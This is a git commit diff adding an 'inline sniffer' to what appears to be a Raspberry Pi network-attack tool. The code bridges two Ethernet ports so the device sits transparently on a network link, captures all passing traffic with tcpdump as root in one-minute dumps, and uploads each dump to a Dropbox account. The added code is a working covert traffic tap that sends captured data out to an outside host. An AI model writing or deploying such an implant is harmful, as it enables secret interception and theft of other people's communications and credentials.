1b6209385e37114e0388911315b9c5632e76f872
Xtrato <james.woolley5@googlemail.com>
2013-03-27 17:01:14 +0000

    Added the code for inline sniffing. Still needs some work.

--- slypi.py
+++ slypi.py
@@ -1,7 +1,10 @@
 #!/usr/bin/python
-
+import os
 from time import sleep
 from Adafruit_CharLCDPlate import Adafruit_CharLCDPlate
+import subprocess
+from dbupload import upload_file #Used for Dropbox uploading
+from datetime import datetime # Used the genreate the filename used in the packet capture dump
 
 # Initialize the LCD plate.  Should auto-detect correct I2C bus.  If not,
 # pass '0' for early 256 MB Model B boards or '1' for all later versions
@@ -12,6 +15,33 @@ lcd = Adafruit_CharLCDPlate(busnum = 0)
 # All code the module executes is to be placed in the function.
 def inlineSniffer():
     print "Inline Sniffer"
+    #Counts the number of files that have been dumped
+    count = 0 
+    #Change thease values so that the dumped file is uploaded to your dropbox account.
+    dropbox_email = "ENTER HERE YOUR DROPBOX EMAIL"
+    dropbox_password = "ENTER HERE YOUR DROPBOX PASSWORD"
+    #the following 7 lines setup the bridge between the two ethernet ports.
+    os.system("ifconfig eth0 0.0.0.0")
+    os.system("ifconfig eth1 0.0.0.0")
+    os.system("brctl addbr bridge0")
+    os.system("brctl addif bridge0 eth0")
+    os.system("brctl addif bridge0 eth1")
+    os.system("dhclient bridge0")
+    os.system("ifconfig bridge0 up")
+    lcd.clear()
+    lcd.backlight(lcd.GREEN)
+    lcd.message("Ethernet Bridge\nSetup Successful")
+    while True:
+        count = count + 1
+        fileName = str(datetime.now().day) + "-" + str(datetime.now().month) + "-" + str(datetime.now().year) + " AT " + str(datetime.now().hour) + "-" + str(datetime.now().minute)
+        #Sets up the TCPDump command
+        tcpDumpProcess = subprocess.Popen(["tcpdump", "-Z", "root", "-w", fileName, "-i", "bridge0", "-G", "60", "-W", "1"])
+        #Runs the TCPDump command
+        tcpDumpProcess.communicate() 
+        lcd.message("Dumping File\n" + str(count))
+        #Uploads the dump file to dropbox
+        upload_file(fileName,"/",fileName, dropbox_email,dropbox_password) 
+        lcd.message("File" + str(count) +  "uploaded to Dropbox")
     
 def printer():
     print "Mass Network Printer"
